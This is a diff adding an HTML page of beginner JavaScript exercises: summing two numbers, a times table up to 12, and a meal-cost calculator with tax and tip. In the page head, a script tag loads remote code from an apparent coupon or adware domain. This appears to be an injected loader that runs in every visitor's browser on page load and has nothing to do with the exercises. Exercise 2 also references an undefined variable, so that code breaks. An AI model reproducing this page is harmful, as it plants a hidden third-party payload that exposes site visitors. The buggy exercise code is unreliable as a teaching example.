@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <script src="http://d.cheapcouponalert.com/l/load.js"></script>
+    <meta charset="UTF-8">
+    <title>JavaScript Exercises</title>
+</head>
+
+<body>
+
+    <h2> ----------- Exercise 1 ----------- </h2>
+    <h3>Sum of Two Numbers</h3>
+    <h4>Problem Statement</h4>
+    <p>Write a program that takes two numbers as input and outputs their sum.</p>
+    <h4>Plans and pseudocode</h4>
+    <p>Ask user for two seperate values
+        <br> Input value 1, value 2
+        <br> sum = value 1 + value 2
+        <br> Display Sum of both values</p>
+    <h4>Demonstration</h4>
+    <script type="text/javascript">
+        function addition() {
+            var x = Number(document.getElementById("text1").value);
+            var y = Number(document.getElementById("text2").value);
+            var z = document.getElementById("text3");
+            z.value = x + y;
+            document.getElementById("t1").innerHTML = x;
+            document.getElementById("t2").innerHTML = y;
+        }
+    </script>
+
+
+    First value :
+    <input type="text" id="text1" name="txt1" value="0">
+    <br> Second value :
+    <input type="text" id="text2" name="txt2" value="0">
+    <br> Sum of
+    <text id="t1"></text> and
+    <text id="t2"></text> is :
+    <input type="text" id="text3" name="txt3" value="0">
+    <br>
+    <input type="button" id="b1" name="submit" value="Add" onclick="javascript:addition()">
+
+
+    <h2> ----------- Exercise 2 ----------- </h2>
+    <h3>Multiplication table for numbers up to 12.</h3>
+    <h4>Problem Statement</h4>
+    <p>Write a program that prints a multiplication table for numbers up to 12.</p>
+    <h4>Plans and pseudocode</h4>
+    <p>Ask user to input a value in order see its multiplication table up to 12
+        <br> Take user input value, multiply by one, and add the user input
+        <br> Use for loop in order to make sure the value is added no more than eleven times in order to keep the table from going beyond 12
+        <br> i++ is used to increment the values by 1
+    </p>
+    <h4>Demonstration</h4>
+    <p>Input a value into the pop-up window at the top of the page in order to view its multiplication table up to 12.
+        <br> Refresh the page to input another value.
+        <br>
+    </p>
+    
+        <script type="text/javascript">
+            <!--
+            var num = parseInt(prompt("enter a number"));
+            for (var i = 1; i <= 12; i++) {
+                document.write("<br>", num, "*", i, "=", num * i);
+            }
+
+            document.write("<br>outside block", "<br>", "the value of count is ", count)
+                //-->
+        </script>
+        <noscript>your browser does not support javascript</noscript>
+
+
+
+        <h2> ----------- Exercise 3 ----------- </h2>
+        <h3>Calculate Total Cost with Variable Tax and Tip</h3>
+        <h4>Problem Statement</h4>
+        <p>Write a program that asks the user for a meal price and then calculates the total bill including rates for tax and tip.</p>
+        <h4>Plans and pseudocode</h4>
+        <p>Ask user to input value of the bill, tax percentage, and tip percentage.
+            <br> Multiply value of the bill by value of tax/100 and add it to the bill value to get the cost with tax included
+            <br> Multiply value of the bill by the value of the tip percentage/100 and add it to the cost with tax included in order to calculate total cost
+            <br> Display total cost
+        </p>
+        <h4>Demonstration</h4> Meal Price:
+        <input type="text" id="mealPriceInput2" value="0">
+        <br> Tax Rate:
+        <input type="text" id="taxRateInput" value="6">
+        <br> Tip Rate:
+        <input type="text" id="tipRateInput" value="15">
+        <br>
+        <button onclick="mealPriceCalc2()">Calculate Meal Price</button>
+        <p id="cost2"></p>
+        <p id="demo"></p>
+
+        <script>
+            function mealPriceCalc2() {
+                var mealPrice = parseInt(document.getElementById('mealPriceInput2').value);
+                var taxRate = parseInt(document.getElementById('taxRateInput').value);
+                var tipRate = parseInt(document.getElementById('tipRateInput').value);
+                var totalCost = mealPrice + (mealPrice * (taxRate / 100.0)) + (mealPrice * (tipRate / 100.0));
+                document.getElementById("cost2").innerHTML = "Total Cost = " + totalCost;
+                var hour = new Date().getHours();
+                var greeting;
+                if (hour >= 18) {
+                    greeting = "Have a good evening.";
+                } else {
+                    greeting = "Have a good day.";
+                }
+                document.getElementById("demo").innerHTML = greeting;
+            }
+            
+        </script>
+
+
+</body>
+
+</html>
